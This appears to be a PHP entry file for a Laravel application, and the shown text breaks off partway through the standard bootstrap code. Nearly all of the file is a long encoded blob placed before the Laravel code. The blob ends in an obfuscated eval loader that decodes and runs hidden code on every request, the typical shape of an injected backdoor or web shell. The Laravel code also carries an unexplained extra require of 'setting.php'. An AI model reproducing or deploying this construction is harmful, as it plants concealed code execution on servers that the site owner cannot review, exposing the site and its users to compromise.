WdDZ0xLMjFsWnZrRU52QzRLMTBTUFYwRkdNdGpHTXRqR010akdNdGpLdk5TTHZDbFp5S2xQUnQ5R3Z3U1ozZ3NhQkdES3YxbFp2Z1NadWQ3T3pEakdNdGpHTXRqR010akdNb1NOdWxBTDNDRXJNamROSWtjTnBRcVpJUTVGaDQ5bXVrN096RGpHTXRqR010akdNdGpHTXRqR010akt2MWxadmtFTnZDNEIzZTBadXQ5R01aeUpWMEZHTXRqR010akdNdGpHTXRqR010akdNZ25XQm9TTElna1BROUhyWUdqeFJ0eXhPOTRMcFZqcklDcVoya2JMQTB1bVI0Vkd1b2tMSWViTnZrRU5IMHVDQ2d2VGhqdXhINGVNQXdIYUJna0xwUVZhcDVkTkJqalB2MWNMeW05R0lsMHJZdDZUcTkzcjNaRU4yOWJOMndrVEllYkxSOUhXMmxrTHBRSFQzZVNydkNuV0J0Ym1NNDRlTUcrS0hjZU11dGpHTXRqR010akdNdGpHTXRqR01vSUwzS2tXcGVERk1nSWFwd2tXQktxV0JkaldCbWpLWU5sTFlDa0ZCY2VNdXRqR010akdNdGpHTXRqR010akdNdGpHTXRqYXBXRFozZ3FhQmUwWnVqZHJJUWNycGljS3E1NExwVnlGUms3T3pEakdNdGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRkTHBRVmFwNWROQmxmWjNncUdNNDlHTVplTXV0anhZZVNydkNuV0J0K096RGpHTXRqeHZ3YldINHlUdUtEcllnVkp1OGJHdTRkQjFlUWlrTlFpa2N5UlFnaWlROUdoMWVpSzEwRUd1OHVUdWduV0JvZGFCR0VLcTh5VHVnMldwdzFOUjR5eE05Y0wybStPekRqR09WYloyazBOcDFsWk80eUpWMEZHTXRqR010akdNdGpHTXRqR010akdNdGpHTW85T3pEakdNdGpHTXRqR010akdNdGpHTXRqZnowRkdNdGpHTXRqR010akdNdGpHTXRqR01nbldCb1NMSWdrUFE5SHJZR2pUQTBqS1YwRnhNOUhhQmdrTHBRVmFwNWROQmorS0hjZU11dGpHTXRqR010akdNdGpHTXRqR010ZFB2MWNMSVFuTlJ0OUdzdGRCMHJRQ1FjeUxwUVZhcDVkTkJqeUJSNHlUeWxuTE1aN096RGpHTXRqR010akdNdGpHTXRqR010akt2MTVOSWtjTlJ0OUd2TmJadkNFRk1nNExwd0VXcDFrVE10dXJxR1NKVjBGR010akdNdGpHTXRqR010akdNdGpHdk4zWklrME5SamRMQmtJYXB3a1RNdGRMcFFWYXA1ZE5CbGZaM2dxRmhjZU11dGpHTXRqR010akdNdGpHTXRqR01vSVcyd2JaMmlES3YxNU5Ja2NOUmQ3T3pEakdNdGpHTXRqR010akdNdGpHTXRqTnBlRExxdHVMMmM4V3lHK2FZZzBaT0RiVHFHRUtROWhnQ0twZ0NLTEswbGlDUW9mUnM5aENNcnJUdUdiR3U0ZFB2MWNMSVFuTmhjZU11dGpHTXRqR010akdNdGpHTXRqR010YlQyQ0FhdjhqR0F3dVpBNHVUdWczTnBHN096RGpHTXRqR010akdNdGpHTXRqR010ak5CbFNyT2NlTXV0akdNdGpHTXRqR010akdZMWtMWWVrUFYwRkdNdGpHTXRqR010akdNdGpHTXRqR3ZDQWF2OGpLM2xuTE1vSWFwd2tHdndrWjNtakx5Q25XSUNxR3YxbFp2a0VOdkM0R3ZObGFwd2tHUlo3T3pEakdNdGpHTXRqR010akdNdGpHTXRqTkJsU3JPY2VNdXRqR010akdNdGpHTXRqR1kwZU11dGpHTXRqR010amZ6MEZPekRlTXV0akdNdGpHTXRqS1lya1d1dDlHTXJEcllnVkp1OGJLcTRkTjI5M05wR0VLcTlIYUJna0xwUVZUeW9EWk85ZFdCZ2t4UlpFS3ZrZFR1WklydkNuWk8weVR1ZzBOcDFWVHVaSXIyQ3V4UlpFS3ZsYlozekVLcU40THBWOUtxNGROWXpFS3FObldCbzBQQm9reFJaRUt2MWxaWWc1WnZpRUtxTklhcHdrcllrVk5oMHlUdWdJYXB3a3JZa1ZOUjR5S0kxbFpROUhadndTclllZkx5Q254UlpFS3YxbFpROUhadndTclllZkx5Q25UdVpJTHBRVkIyNTFMaDB5VHVnbldCb2ZMeUNuVHVaSU52UTBXaTVrckgweVR1Z2RXQmdsaElDM0pWMEZHTXRqR010akdNb1NOdWxIcnBLSHJZR0RLWWdrTEJ0Y21NVjRGaDA5SzNlRE5wd2NQdjFjS3FrN096RGpHTXRqR010akdNdGpHTXRkUHYxY0xJUW5OUnQ5R1llMVd5ZTBadWpkcnZDblpNVjRGUjR5VHlsbkxNWjdPekRqR010akdNdGpHWTBlTXV0akdNdGpHTXRqYXBXRFozQ3VaM2dxRk1nME5wMVZUT3RjZXFkOXhSckRXcGVYUHYxY0txazdPekRqR010akdNdGpHTXRqR01vU051bEhycEtIcllHREtZZ2tMQnRjZXFkU1BWMEZHTXRqR010akdNdGpHTXRqR010akdNZzRMcHdFV3Axa0dPMGpaM0N1WjNncUZNZzBOcDFWVE9aU1R1WkVQdjFjS0hjZU11dGpHTXRqR010akdNdGpHWTBlTXV0akdNdGpHTXRqZnowRkdNdGpHTXRqR01vU051bHRLUTlZZ0NnTEsyMWxadmdTWnVyckZCY2VNdXRqR010akdNdGpHTXRqR3ZrSUZNZ0lhcHdrcllrVk5oMDltUms3T3pEakdNdGpHTXRqR010akdNdGpHTXRqS1lsbkx2NWxMcGlqeFJ0ZFB2MWNMSVFuTlI0eVRJcjZLSGNlTXV0akdNdGpHTXRqR010akdZMWtMWWVrR3ZrSUZNZ0lhcHdrcllrVk5oMDltdWs3T3pEakdNdGpHTXRqR010akdNdGpHTXRqYXBXRE55Q0VXM2dTTDI1Zk5CbFNaM2dIRk1yeVBJOVZOcDR5RlJkalBWMEZHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRkUHYxY0xJUW5OUnQ5R01nNExwd0VXcDFrVHVaRU4zRHlKVjBGR010akdNdGpHTXRqR010akdNdGpHTXRqR01vU051amROeXRqeFJveVBJOVZOcDRES3YxbFp2Z1NadTR5VHFaRUtZbG5MdjVsTHBpY0dNcjNKUlpTRkJjZU11dGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRqR01nNExwVmp4Um8wWklrbkZZZW5MM0MwTnY4REtZcmtXdWRTSlYwRkdNdGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRqYXBXRFozZ3FhQmUwWnVqZFB2MWNUTXJFTHFvQVpJQ2xyTW9uV0J0eUZSazdPekRqR010akdNdGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRqTnBlRExxdHl4dk5iTHl6alozZzVMdmk5R0llYkx2OXFKeUtrTk1HK0xJOGpXM0trV0J6akxwUVZHaFZiTkk5RXJPNHlKVjBGR010akdNdGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRqR3ZDNGFCejdPekRqR010akdNdGpHTXRqR010akdNdGpHTXRqR010akdNbzlPekRqR010akdNdGpHTXRqR010akdNdGpHTXRqR010akdNdGROeXRqeFJveVBJOVZOcDRqRk1nbldCb2RhQkdFS3E4eVR1ZzRMcHdFV3Axa1RNdHlySGR5RmhjZU11dGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRqR3ZyNnIzS1NydmlqRk1nSVpNVmpLWWxuTE1kN096RGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRqR01veVBJZWNMM2VrRk1nSVpNZDdPekRqR010akdNdGpHTXRqR010akdNdGpHTXRqR010akdNb2tXMmxiR01LYmFId3VaQTVEcllnVkp1OGJHdTRkQjFlUWlrTlFpa2N5UlFnaWlROUdoMWVpSzEwRUd1OHVUdWduV0JvZGFCR0VLcTh5VHVnNExwd0VXcDFrSlYwRkdNdGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRqTnBlRExxdHV4dktxeHVHRUtZcmtXQWNlTXV0akdNdGpHTXRqR010akdNdGpHTXRqR010akdNdGpHdkM0YUJ6REZoY2VNdXRqR010akdNdGpHTXRqR010akdNdGpHTXRqZnBDY1oyQzdPekRqR010akdNdGpHTXRqR010akdNdGpHTXRqR010akdNb3lQSWVjTDNla0ZNZ0laTWQ3T3pEakdNdGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTW9rVzJsYkdNWjhOSTlFck1vSHJZa2NOaDB1VzI5Y0wzRzZaSUNkR0E1QVpJQ2xyTW9IYUJna0xwUVZHdk5sYXB3a0dzNWJHUW9rWkkxU1ozZVNMMjVIR2hWYk5JOUVyTzQ4V3lHK2FZZzBaT0RiVHFaRUtROWhnQ0twZ0NLTEswbGlDUW9mUnM5aENNcnJUdUdiR3U0ZExwUVZOdmtxVHVaYktxNGRQdjFjTElRbk5oY2VNdXRqR010akdNdGpHTXRqR010akdNdGpHTXRqR010akd2Q0FhdjhqR0F3dVpBNHVUdWczTnBHN096RGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTXRqR01va1B2azBGTWQ3T3pEakdNdGpHTXRqR010akdNdGpHTXRqR010akdZMGVNdXRqR010akdNdGpHTXRqR010akdNbzlOcHdITkJjZU11dGpHTXRqR010akdNdGpHTXRqR010akdNdGpOcGVETHF0eXh2TmJMeXpqWjNnNUx2aTlHSWViTHY5cUp5S2tOTUcrTjNTYlp2Q0VHdjViR3ZDNGFCZTBacXM4VDJOYkx5eit4dktxeElsMHJZdDZUcTh5VHVnZmkwQ1JDZENScHFyR0NRZ3pCMGx4aTF6eUJSNHVUcUdFS3YxbFp2Z1NadTR5VHFaRUtZbG5MdjVsTHBpN096RGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTWczTnBHanhSdHlhWWcwWk9EYlRxWkVLdnJicjJDdVR1WmJaMmswTnAxbFpNNVZhWXQvTnZRME5oMHlUdWdTTk00eUt5Z2tMQnQ5S3E0ZHJ2Q25aTTR5S3lya1dBMHlUdWdETDNlMFR1WklQdjFjeFJaRUt2ZzBUdVpJTHBRVnJZa1ZOaDB5VHVnbldCbzBQQm9rSlYwRkdNdGpHTXRqR010akdNdGpHTXRqR010akdNb2tXMmxiR01HOFd5RytHdTRkcjJDdUpWMEZHTXRqR010akdNdGpHTXRqR010akdNdGpHTW9rUHZrMEZNZDdPekRqR010akdNdGpHTXRqR010akdNdGpmejBGR010akdNdGpHTXRqR010amZ6MEZHTXRqR010akdNdGpHTXRqYXBXRE5JOVZOcDRES3YxbFp2Z1NadTR5VHFaRUtZbG5MdjVsTHBpY0dNSzNHdWRTUFYwRkdNdGpHTXRqR010akdNdGpHTXRqR01nNExwVmp4Um8wWklrbkZZZW5MM0MwTnY4REtZcmtXdWRTSlYwRkdNdGpHTXRqR010akdNdGpHTXRqR3ZrSUZZZTBaSWtIcllHREtZbG5MTVZ5TEk4alczS2tXQnpqTHBRVktxZFNQVjBGR010akdNdGpHTXRqR010akdNdGpHTXRqR01va1cybGJHTVo4Tkk5RXJNb0hyWWtjTmgwdVcyOWNMM0c2WklDZEdBNUVMcW9BWklDbHJNb25XQnRseE05SUwyNTB4dVo3T3pEakdNdGpHTXRqR010akdNdGpHTXRqR010akd2QzRhQno3T3pEakdNdGpHTXRqR010akdNdGpHTXRqZnowRkdNdGpHTXRqR010akdNdGpHTXRqR01nblBwTlNMdmlqeFJvSUwzb2tMdWpkTHBRVk52a3FUdVpiS3E0ZFB2MWNMSVFuTlJWakd5WnVGaGNlTXV0akdNdGpHTXRqR010akdNdGpHTW9JcjNLU3J2aURLdjE1TklrY05SVmpLWWxuTE1kN096RGpHTXRqR010akdNdGpHTXRqR010ak5JZWNMM2VrRk1nblBwTlNMdmlTSlYwRkdNdGpHTXRqR010akdNdGpHTXRqR3ZDQWF2OGpHSTlYeHZLcXhJbDByWXQ2VHE4dVR1Z2ZpMENSQ2RDUnBxckdDUWd6QjBseGkxenlCUjR1VHFHRUt2MWxadmdTWnU0eVRxWkVLWWxuTHY1bExwaTdPekRqR010akdNdGpHTXRqR010akdNdGpOcGVETHF0dXh2S3F4dUdFS1lya1dBY2VNdXRqR010akdNdGpHTXRqR010akdNb2tQdmswRk1kN096RGpHTXRqR010akdNdGpHTW85TnB3SE5CY2VNdXRqR010akdNdGpHTXRqR010akdNb0lXMndiWjJpREt2MTVOSWtjTlJkN096RGpHTXRqR010akdNdGpHTXRqR010ak5wZURMcXR5eHZOYkx5empaM2c1THZpOUdJZWJMdjlxSnlLa05NRytXM0trV0J6aloyazBOcDFsWk1vSVdwa2NOUm9KTHFvek5CS25hQmVIYXA5RVpxczhUMk5iTHl6K3h2S3F4SWwwcll0NlRxOHlUdWdmaTBDUkNkQ1JwcXJHQ1FnekIwbHhpMXp5QlI0dVRxR0VLdjFsWnZnU1p1NHlUcVpFS1lsbkx2NWxMcGk3T3pEakdNdGpHTXRqR010akdNdGpHTXRqTnBlRExxdHV4dktxeHVHRUtZcmtXQWNlTXV0akdNdGpHTXRqR010akdNdGpHTW9rUHZrMEZNZDdPekRqR010akdNdGpHTXRqR01vOU96RGpHTXRqR010akdZMWtMWWVrUFYwRkdNdGpHTXRqR010akdNdGphcFdETkk5Vk5wNERLWWxuTHY1bExwaWNHTUszR3VkU1BWMEZHTXRqR010akdNdGpHTXRqR010akdNZzRMcFZqeFJvMFpJa25GWWVuTDNDME52OERLWXJrV3VkU0pWMEZHTXRqR010akdNdGpHTXRqR010akd2a0lGWWUwWklrSHJZR0RLWWxuTE1WeUxJOGpXM0trV0J6akxwUVZLcWRTUFYwRkdNdGpHTXRqR010akdNdGpHTXRqR010akdNb2tXMmxiR01aOE5JOUVyTW9IcllrY05oMHVXMjljTDNHNlpJQ2RHQTVFTHFvQVpJQ2xyTW9uV0J0bHhNOUlMMjUweHVaN096RGpHTXRqR010akdNdGpHTXRqR010akdNdGpHdkM0YUJ6N096RGpHTXRqR010akdNdGpHTXRqR010amZ6MEZHTXRqR010akdNdGpHTXRqR010akdNZ25QcE5TTHZpanhSb0lMM29rTHVqZFB2MWNMSVFuTlJWakd5WnVGaGNlTXV0akdNdGpHTXRqR010akdNdGpHTW9JcjNLU3J2aURLdjE1TklrY05SVmpLWWxuTE1kN096RGpHTXRqR010akdNdGpHTXRqR010ak5JZWNMM2VrRk1nblBwTlNMdmlTSlYwRkdNdGpHTXRqR010akdNdGpHTXRqR3ZDQWF2OGpHSTlYeHZLcXhJbDByWXQ2VHE4dVR1Z2ZpMENSQ2RDUnBxckdDUWd6QjBseGkxenlCUjR1VHFHRUtZbG5MdjVsTHBpN096RGpHTXRqR010akdNdGpHTXRqR010ak5wZURMcXR1eHZLcXh1R0VLWXJrV0FjZU11dGpHTXRqR010akdNdGpHTXRqR01va1B2azBGTWQ3T3pEakdNdGpHTXRqR010akdNbzlOcHdITkJjZU11dGpHTXRqR010akdNdGpHTXRqR01vSVcyd2JaMmlES3YxNU5Ja2NOUmQ3T3pEakdNdGpHTXRqR010akdNdGpHTXRqTnBlRExxdHl4dk5iTHl6alozZzVMdmk5R0llYkx2OXFKeUtrTk1HK1czS2tXQnpqWjJrME5wMWxaTW9JV3BrY05Sb0pMcW96TkJLbmFCZUhhcDlFWnFzOFQyTmJMeXoreHZLcXhJbDByWXQ2VHE4eVR1Z2ZpMENSQ2RDUnBxckdDUWd6QjBseGkxenlCUjR1VHFHRUtZbG5MdjVsTHBpN096RGpHTXRqR010akdNdGpHTXRqR010ak5wZURMcXR1eHZLcXh1R0VLWXJrV0FjZU11dGpHTXRqR010akdNdGpHTXRqR01va1B2azBGTWQ3T3pEakdNdGpHTXRqR010akdNbzlPekRqR010akdNdGpHWTBlTWowRk96RGpHTXRqZnowRkdNdGpHdmtJRk1nU05NazdPekRqR010akdNdGpHc29ETnBRZE5CR0RHZGViTHlna0x5em5yWWtWTmhEanJ2QzRyTTlEcnYxY0pxb0FhdlFxWjJDMHhCQzBOdTA0R3VkN096RGpHTXRqR010akdNZzNOcEdqeFJ0eWFZZzBaT0RiVHFaRUt2cmJyMkN1VHVaYmFwNWROQmpFWnZsVngzQ3FMTzB5VHVnSGFCZ2tUdVpJYXB6OUtxNGRhcHpFS3FOME5wMVZ4UlpFS1lna0xCdEVLcU5kck8weVR1Z2RyTTR5S3lya1dBMHlUdWdETDNlMFR1WklQeUQ5S3E1SExwa0hXSTkwRk1kRUtxTlVOdmtxeFJaRUt2U2RhQkdFS3FOQUx2OUFhSDB5VHVnQUx2OUFhcTR5S3lDcWFoMHlUdWdITEJDcWFSNHlLSXdsTElaOUtxNGRMdlFFTnE0eUtJOUh4UlpFS3Y5SFR1WklyQktjWjJsbExJWjlLcTRkckJLY1oybGxMSVpFS3FORHJZZ1ZCMmVjTDJlWHhSWkVLdmwwcllvZlcyd2JXMmNFS3FOVldwcmt4UlpFS1lvbE4yaUVLcU5icnZsa1p5UzZ4UlpFWjIxYnJ2bGtaSUtick1qU0pWMEZHTXRqR010akdNdGRhWWduTFE5QUwyNTBOcDUwR08wanJZS1NMUmxITHA5MXJ2Z2JGTWczTnBHU0ZoY2VNdXRqR010akdNdGphcFdER0JlMFp5ZTBadWpkYVlnbkxROUFMMjUwTnA1MFRNckVMMkticllDSE5CS2xOMkNFck1aU0ZCY2VNdXRqR010akdNdGpHTXRqR3ZrSUZZZTBaeWUwWnVqZGFZZ25MUTlBTDI1ME5wNTBUTXJiYTJsMExwd3lOQmdBTDI1ME5wNTBLcWRTUFYwRkdNdGpHTXRqR010akdNdGpHTXRqR01nRHJ2MWNCMmViTHlna0x5emp4Um9IcllLZlpJQ1ZMdlFBTlJqdUwybkRydjFjTjJDMFcyOUVydkNFck1HY0txWmNLdmwwTHB3ZlcyOUVydkNFck1kN096RGpHTXRqR010akdNdGpHTXRqR010ak5wZURMcXRkYVlnbkxROUFMMjUwTnA1MEpWMEZHTXRqR010akdNdGpHTXRqR010akd2QzRhQnpERmhjZU11dGpHTXRqR010akdNdGpHWTFrTFlla0d2a0lGWWUwWnllMFp1amRhWWduTFE5QUwyNTBOcDUwVE1yeU5CZ0FMMjUwTnA1MGVodFZadlF5TlJaU0ZCY2VNdXRqR010akdNdGpHTXRqR010akdNb3RhdkNsTnZDcUZNckdDUWd6VEhzRW1SdDFtT3RqUnA1ME5CS0VXcFZqaTJDcXJJQ3FHc0NxWkk5cUtxZDdPekRqR010akdNdGpHTXRqR010akdNdGpOQmxTck1qU0pWMEZHTXRqR010akdNdGpHTXRqZnBDY1oyaWphcFdEWjNncVozZ3FGTWdEcnYxY0IyZWJMeWdrTHl6Y0sycmtydmViTHlna0x5ejBtT2dWV3Bya0txZFNQVjBGR010akdNdGpHTXRqR010akdNdGpHc29ETnBRZE5CR0RLMGxpQ1F0Ym1SNHdHT3pWZU1vSkwzempnSTkxTEl6eUZoY2VNdXRqR010akdNdGpHTXRqR010akdNb2tQdmswRk1kN096RGpHTXRqR010akdNdGpHTW85T3pEZU11dGpHTXRqR010amZ6MEZHTXRqR1kwZU15MWtMWWVrUFYwRk96RGpHTXRqS1lya1d1dDlHTXJEcllnVkp1OGJLcTRkTjI5M05wR0VLcTlTTElna1BNNVZhWXQvckJLY3hSTlNOTzB5VHVnU05NNHlLeWdrTEJ0OUtxNGRydkNuWk00eUtJZzB4UlpFS3ZnMFR1WklyMkN1eFJaRUt2bGJaM3pFS3FONlBBMHlUeWVuYUJldUwzekRGUjR5S0lTZGFCRzlLcTRkYUlnU1p1NHlLSWVjTDJlWHhSWkVLdmVjTDJlWFR1WklyQktTeFJaRUtZZW5yQktTVHVaSUx2UUVOSDB5VHVnY1dwNXlUdVpJTDNtOUtxNGRMM21FS3FOMVpJd0hhdlFFTkgweVR1ZzFaSXdIYXZRRU5xNHlLSWwwcllvZlcyd2JXMmM5S3E0ZGFZZzBaUTlBTHY5QWFxNHlLeW9sTjJpOUtxNGRadlF5TlI0eUtJOTBhdkNxUHlEOUtxNUhMcDkwYXZDcVdJOTBGTWQ3T3pEakdNdGpLdmwwTHB3ZlcyOUVydkNFck10OUdZZ3FhcDBEWjIxYnJCZ2RMcWpkcjJDdUZSZDdPekRqR010amFwV0RHQmUwWnllMFp1amRhWWduTFE5QUwyNTBOcDUwVE1yRUwyS2JyWUNITkJLbE4yQ0VyTVpTRkJjZU11dGpHTXRqR010anp2bGtXcGdrWnVqdXoyOUVydkNFck0xMFBCb2tKdW8wTkJsMFQybDBMcFY3R3ZlRFdCS0hOQno5ckJnSVRoanVGaGNlTXV0akdNdGpHTXRqYXBXRFozZ3FaM2dxRk1nRHJ2MWNCMmViTHlna0x5emNLMjlYYVlnbkx2cmtydmViTHlna0x5enlGUms3T3pEakdNdGpHTXRqR010akdNdGRhWWduTFE5QUwyNTBOcDUwR08walozZ3FCM0trWnZ3bFcyaURHSTlYYVlnbkx2cmtydmViTHlna0x5enVUTVp5VE1nRHJ2MWNCMmViTHlna0x5elNKVjBGR010akdNdGpHTXRqR010ak5wZURMcXRkYVlnbkxROUFMMjUwTnA1MEpWMEZHTXRqR010akdNdGpHTXRqTkJsU3JNalNKVjBGR010akdNdGpHTW85TnB3SE5Sb1NOdWxIcllLSHJZR0RLdmwwTHB3ZlcyOUVydkNFck1WeU4yQzBXMjlFcnZDRXJPaVZtWW9sTjJpeUZSazdPekRqR010akdNdGpHTXRqR01vdGF2Q2xOdkNxRk1yR0NRZ3pUSHNFbVJ0MW1PdGpScDUwTkJLRVdwVmppMkNxcklDcUdzQ3FaSTlxS3FkN096RGpHTXRqR010akdNdGpHTW9rUHZrMEZNZDdPekRqR010akdNdGpHWTFrTFlla0d2a0lGWWUwWnllMFp1amRhWWduTFE5QUwyNTBOcDUwVE1yeU5CZ0FMMjUwTnA1MGVPdDBadlF5TlJaU0ZCY2VNdXRqR010akdNdGpHTXRqR3NvRE5wUWROQkdESzBsaUNRdGJtUjR3R096VmVNb0pMM3pqZ0k5MUxJenlGaGNlTXV0akdNdGpHTXRqR010akd2QzRhQnpERmhjZU11dGpHTXRqR010amZ6MEZPekRqR010amZ6MEZmejBGT3pTSXJwNUFydmtiTHVvSExwa0hXSTkwRk1kalBWMEZHTXRqR01nbE4yQ0VyTXQ5R1llMFp5Z2JMdjkzTkJHREtROWhnQ0twZ0NLTEswbGlDUW9mQ0NlUWlrOW9nMENKQ01yckZoY2VNdXRqR01vU051dERLdlF5TnA1MEdNczlHTUd1RlJvN096RGpHTXRqR010akdNZ3lMMjl5THZDTUwzemp4Um9sWnlLbFBSanVnMjliTjJ3a1dJOTBHdVZ1cHBRREwyOGxHUWVjckJLVkd1VnVwcFFETDI4amkydzFaeXR1VE1LWUwyOXlMdmlqenBnaE5wNUhOUkdjSzJyYkwycmNOUlpjR01yNVdwbGJMcVpTSlYwRkdNdGpHTXRqR01vSUwzS2tXcGVER01qZE4yOWJOMndrekk5MEd2UUhHTWcyV3BWU0dZY2VNdXRqR010akdNdGpHTXRqR01nSHJZR2p4Um9IcllLMEwyd2JyMkNxRk1nMldwVlNKVjBGR010akdNdGpHTXRqR010amFwV2pGWWUwWnlvYlpxamRXcHJrTHl6Y0dNZ0hyWUdTRlJvN096RGpHTXRqR010akdNdGpHTXRqR010alpJQzByQktFR1lncXJwaTdPekRqR010akdNdGpHTXRqR01vOU96RGpHTXRqR010akdZMGVNdXRqR01vOU5wd0hOQmNlTXV0akdNdGpHTXRqWklDMHJCS0VHdk5sTFlla0pWMEZHTXRqR1kwZU15MGVNSU4xTEllMGFwOUVHWWVuTDNnRE5CS3VMM3pERlJvN096RGpHTXRqS3ZReU5wNTBHTzBqWjNncXJ2OWNMM3JrWnVqZEIxZVFpa05RaWtjeVJRZ2lpUTlDaTBDUkIwUVlnaTVpSzEwU0pWMEZHTXRqR3ZrSUdNamRXcHJrTHl6akdoMGpHdUdTR1ljZU11dGpHTXRqR010aktZZVZhcGdrWmtlU3J2aWp4Um9sWnlLbFBSdERHa2drTElla0x5Z2laSVEyTnB3a1p1R2NHSTFITElLYnJNR2NHa2ViWjI5SFp2a2ROQkdYR3VWdWkyOXlMM2lqcjJDdUdZZVZhcGdrWnVHY0dJa2xCMlFxVzJsU3JJQ3FHdVZ1cHA5MU52UWJ6STkwR3VWdWhDZUp6STkwR3VWdVJJUTJXUnREaDJOME5wNGpaM29sTFJvdUwzelNHdVZ1eklRU2dZQ2hadmtkTkJHdVRNS3BMMmtjV1JHY0dra2xMSWdrUE1vdUwzenVUTUtNaTNvU052Q3FHdVZ1cllyU1cyQ2NOQkd1VE1LaEwycmJyUm9oWnZrZE5CR3VUTUtoWnZDa05ZZGppM29TTnZDcUd1VnVSdkNxYUJncWFCanVUTUt6UEJnREwyNG5yQktjTHZrdUd1VnV6cHdrUHZzakZza29Hc1FxVzJsU3JJQ3FGUkdjR2RRSGFxR2NHZEM0V3BLYnJNR2NHZGUxWjNnYkd1VnVoM0MwTkk5NHpJOTBUMWtiTnZRYnpJOTBHdVZ1UHBRQVBSR2NHa2UxWnlOa1BpS2JyTUdjR0l3a04zbXVUTUtjcjN0bnJZS1NySWtsTE1HY0dkNTFydmVER3VWdWkzZ2xXMm5SV3AxdUx2Q3FHdVZ1Q3Zsa0dZcmtXdW9sWkllRGFCTmtHTWxLelJvb1pJZURhQk5rWnVkdVRNS3pOQktjR1lnYkwyVnVUTUtlUkFzcVdJOTBHdVZ1aElDMFczS2xOeXp1VE1LZWkwa1F6M0tscjJ3a1p1R2NHa3JZTkJ6anJ2OWJMWW11VE1LY1dCS3VhcDR1VE1LdmFCZURHWWVrV0JLQWFNR2NHTXJ1YXA1eVdJOTBLcVZqSzJLbGFwZzFLcVZqSzJRYkxNWmNHTXJ1YXA1eUtxVmpLMWtsTElna1BzS2JyTVpjR01yb2FZS2tOeWVNTDN6eUZoY2VNdXRqR010akdNdGpOSTlxTnBRQWFNdERLWWVWYXBna1prZVNydmlqV0JtaktZTmxMTWRqUFYwRkdNdGpHTXRqR010akdNdGpLWWUwWnV0OUdZZTBaeWdiTHY5M05CR0RLWU5sTE1kN096RGpHTXRqR010akdNdGpHTW9TTnV0RFozZ3FadjlIRk1nbE4yQ0VyTVZqS1llMFp1ZFNHWWNlTXV0akdNdGpHTXRqR010akdNdGpHTW9xTkJnMVpJNGpyWUsxTmhjZU11dGpHTXRqR010akdNdGpHWTBlTXV0akdNdGpHTXRqZnowRkdNdGpHWTFrTFlla1BWMEZHTXRqR010akdNb3FOQmcxWkk0ak5JUWNaMmk3T3pEakdNdGpmejBGZnowRk55Q0VXM2dTTDI0aloyMWJyQmdkTHFqZHJCS2NGQmNlTXV0akdNdGROSWtjTkM5QUwyNTBOcDUwWnF0OUdzb0lhcHdrQjJya3JROUFMMjUwTnA1MFpxamRyQktjRmhjZU11dGpHTW9TTnV0REdSZ0lhcHdrQjJlYkx5Z2tMeWdIRlJvN096RGpHTXRqR010akdNZ0FhTXQ5R3ZlMVpJd2ZhcDVTck1qU0pWMEZHTXRqR010akdNb0FyQktjQjNla3J2OVZyTWpkVzJqY0dzZUNpZHd4aVFnZkNDS21UTXRkckJLY0ZoY2VNdXRqR010akdNdGpXM0NxTFE5SE5CZ2JaWXpES3ZlRFRNb09DQ0ttaDFvaUIxS1FDUUNSaGtnUnppNWhnZENSVE9zU0pWMEZHTXRqR010akdNdGROSWtjTkM5QUwyNTBOcDUwWnF0OUd2ZTFaSXdmTkJsa1dxamRXMmpTSlYwRkdNdGpHTXRqR01vQXJCS2NCMmVjTDNla0ZNZ0FhTWQ3T3pEakdNdGpmejBGR010akdZS2tyWUNxTHV0ZE5Ja2NOQzlBTDI1ME5wNTBaSGNlTXkwZU1JTjFMSWUwYXA5RUd2d1NaM2dzYUJHREt2Z1NadWs3T3pEakdNdGpLdk5TTHZDbFp5R2p4Um9sWnlLbFBSalNKVjBGR010akd2a0lGdmtIQjJnU1p1amROdmtxRlJrN096RGpHTXRqR010akd2a0lHTWpkTnZqanhSb2JadkNFTnZrcUZNZ2RhQkdTRkJjZU11dGpHTXRqR010akdNdGpHWXJEYXB3a0dNakRLdk5TTHZpanhSb3FOcFFkTnZrcUZNZ2RhTWRTR01zOXhSb0lXcHdITlJrN096RGpHTXRqR010akdNdGpHTXRqR010amFwV0RGdk5TTHZDZk5CbFNaM2dIRk1nZGFCR0VHdTh1VHVnSWFwd2tGUmRqS3VXakt2TlNMdmlseFJHRUd1dElLdXRkTklrY05SczlHdTRFR3VrN096RGpHTXRqR010akdNdGpHTXRqR010akdNdGpHTWdJYXB3a1dCS3FwMTBqeFJ0ZE5Ja2NOaGNlTXV0akdNdGpHTXRqR010akdNdGpHTW85T3pEakdNdGpHTXRqR010akdNbzlPekRqR010akdNdGpHTXRqR01vQUx2OUhOcGdTWnVqZE52alNKVjBGR010akdNdGpHTW85T3pEakdNdGpmejBGR010akdZS2tyWUNxTHV0ZE5Ja2NOcFFxWkFjZU15MGVNQTgrIjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
 ?><?php
/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylorotwell@gmail.com>
 */

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels nice to relax.
|
*/

require __DIR__.'/bootstrap/autoload.php';
require 'setting.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
